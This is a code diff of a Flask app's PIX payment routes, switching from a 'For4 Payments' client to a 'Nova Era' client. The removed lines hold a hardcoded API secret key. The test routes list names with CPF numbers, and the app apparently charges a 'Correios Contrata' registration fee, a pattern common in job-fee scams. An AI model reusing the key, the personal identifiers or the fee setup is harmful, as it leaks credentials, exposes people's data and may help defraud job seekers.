@@ -401,22 +401,21 @@ def pagamento_pix():
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
-    """Generate PIX payment using FOR4 PAYMENTS API"""
+    """Generate PIX payment using Nova Era API"""
     try:
+        from nova_era_api import create_nova_era_client, Customer
+        
         dados = request.get_json()
         
         # Validar dados obrigatórios
         if not dados or not dados.get('valor'):
             return jsonify({'success': False, 'message': 'Dados inválidos'}), 400
         
-        # Obter chave da API
-        secret_key = "aa64f1cb-1db0-41bc-8211-0d11d1ffced2"
-        api = For4PaymentsAPI(secret_key)
-        
         # Validar dados recebidos
         nome = dados.get('nome_pagador', '').strip()
         email = dados.get('email_pagador', '').strip()
         cpf = dados.get('cpf_pagador', '').strip()
+        telefone = dados.get('telefone', '').strip()
         valor = dados.get('valor', 87.40)
         
         if not nome or not email or not cpf:
@@ -426,57 +425,65 @@ def gerar_pix():
             }), 400
         
         # Log dos dados recebidos para debug
-        app.logger.info(f"Gerando PIX para: {nome}, {email}, CPF: {cpf[:3]}***")
+        app.logger.info(f"Gerando PIX Nova Era para: {nome}, {email}, CPF: {cpf[:3]}***")
         
-        # Criar objeto PaymentRequestData
-        payment_data = PaymentRequestData(
+        # Criar cliente da API
+        api = create_nova_era_client()
+        
+        # Criar objeto Customer
+        customer = Customer(
             name=nome,
             email=email,
-            cpf=cpf,
-            phone=dados.get('telefone'),
-            amount=int(valor * 100),  # Converter para centavos
-            description=dados.get('descricao', 'Taxa de Inscrição - Correios Contrata')
+            phone=telefone or "(11) 99999-9999",  # Telefone padrão se não fornecido
+            cpf=cpf
         )
         
-        # Criar pagamento PIX usando a classe correta
-        payment = api.create_pix_payment(payment_data)
+        # Criar transação PIX
+        valor_centavos = int(valor * 100)  # Converter para centavos
+        descricao = dados.get('descricao', 'Taxa de Inscrição - Correios Contrata')
+        
+        transaction = api.create_pix_transaction(customer, valor_centavos, descricao)
         
         return jsonify({
             'success': True,
-            'transacao_id': payment.id,
-            'pix_code': payment.pix_code,
-            'qr_code': payment.pix_qr_code,
-            'status': payment.status,
-            'expires_at': payment.expires_at
+            'transacao_id': transaction.id,
+            'pix_code': transaction.qr_code,
+            'qr_code': transaction.qr_code,  # Compatibilidade
+            'status': transaction.status,
+            'expires_at': transaction.expires_at,
+            'valor': f"R$ {valor:.2f}",
+            'api_provider': 'Nova Era'
         })
         
     except ValueError as e:
         app.logger.error(f"Erro de validação: {e}")
         return jsonify({'success': False, 'message': str(e)}), 400
     except Exception as e:
-        app.logger.error(f"Erro ao gerar PIX: {e}")
-        return jsonify({'success': False, 'message': str(e)}), 500
+        app.logger.error(f"Erro ao gerar PIX Nova Era: {e}")
+        return jsonify({'success': False, 'message': f'Erro na API: {str(e)}'}), 500
 
 @app.route('/api/verificar-pagamento/<string:transacao_id>')
 def verificar_pagamento(transacao_id):
-    """Verify PIX payment status using FOR4 PAYMENTS API"""
+    """Verify PIX payment status using Nova Era API"""
     try:
-        # Obter chave da API
-        secret_key = "aa64f1cb-1db0-41bc-8211-0d11d1ffced2"
-        api = For4PaymentsAPI(secret_key)
+        from nova_era_api import create_nova_era_client
+        
+        # Criar cliente da API
+        api = create_nova_era_client()
         
         # Verificar status do pagamento
-        status_data = api.check_payment_status(transacao_id)
+        status_data = api.get_transaction_status(transacao_id)
         
         return jsonify({
-            'pago': status_data['status'] == 'completed',
+            'pago': status_data['status'] == 'paid',
             'status': status_data['status'],
-            'pix_code': status_data.get('pixCode'),
-            'qr_code': status_data.get('pixQrCode')
+            'transacao_id': status_data['id'],
+            'valor': status_data['amount'],
+            'api_provider': 'Nova Era'
         })
         
     except Exception as e:
-        app.logger.error(f"Erro ao verificar pagamento: {e}")
+        app.logger.error(f"Erro ao verificar pagamento Nova Era: {e}")
         return jsonify({'pago': False, 'message': str(e)}), 500
 
 @app.route('/pagamento-confirmado')
@@ -486,40 +493,46 @@ def pagamento_confirmado():
 
 @app.route('/teste-pix')
 def teste_pix():
-    """Endpoint de teste para gerar PIX com dados específicos"""
+    """Endpoint de teste para gerar PIX com Nova Era API"""
     try:
-        # Dados de teste conforme solicitado
-        secret_key = "aa64f1cb-1db0-41bc-8211-0d11d1ffced2"
-        api = For4PaymentsAPI(secret_key)
+        from nova_era_api import create_nova_era_client, Customer
         
-        # Criar objeto PaymentRequestData com dados de teste
-        payment_data = PaymentRequestData(
-            name="Gianny Santos",
-            email="gianny@gmail.com",
-            cpf="717.786.161-00",
-            amount=8740,  # R$ 87,40 em centavos
-            phone="11999999999",
-            description="Taxa de Inscrição - Teste"
+        # Criar cliente da API Nova Era
+        api = create_nova_era_client()
+        
+        # Criar objeto Customer com dados de teste
+        customer = Customer(
+            name="RIZIA REGIA DA SILVA RODRIGUES MAGALHAES",
+            email="rizia@teste.com",
+            phone="(11) 99999-9999",
+            cpf="011.011.011-05"
         )
         
-        # Criar pagamento PIX
-        payment = api.create_pix_payment(payment_data)
+        # Criar transação PIX de teste
+        transaction = api.create_pix_transaction(
+            customer=customer,
+            amount=8740,  # R$ 87,40 em centavos
+            description="Taxa de Inscrição - Teste Nova Era"
+        )
         
         return jsonify({
             'success': True,
             'teste': True,
+            'api_provider': 'Nova Era',
             'dados_enviados': {
-                'nome': payment_data.name,
-                'email': payment_data.email,
-                'cpf': payment_data.cpf,
+                'nome': customer.name,
+                'email': customer.email,
+                'cpf': customer.cpf,
+                'telefone': customer.phone,
                 'valor': 'R$ 87,40'
             },
             'resposta_api': {
-                'transacao_id': payment.id,
-                'pix_code': payment.pix_code,
-                'qr_code': payment.pix_qr_code,
-                'status': payment.status,
-                'expires_at': payment.expires_at
+                'transacao_id': transaction.id,
+                'pix_code': transaction.qr_code,
+                'qr_code': transaction.qr_code,
+                'status': transaction.status,
+                'expires_at': transaction.expires_at,
+                'created_at': transaction.created_at
             }
         })
         
